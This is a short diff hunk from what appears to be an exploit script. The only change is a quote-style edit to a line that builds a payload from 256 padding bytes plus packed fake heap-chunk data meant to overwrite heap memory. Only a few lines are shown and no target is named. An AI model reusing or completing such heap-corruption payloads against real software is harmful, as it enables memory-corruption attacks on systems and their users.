@@ -73,7 +73,7 @@ configs = [
 ]
 
 # Pad to length 256 and add heap data for overwrite
-payload = '\x00' * 256 + struct.pack('<14I',
+payload = "\x00" * 256 + struct.pack("<14I",
               # 1. Allocated chunk to be freed
               # Chunk header: (size 0x8)
         0x84, #   0x00: previous_chunk
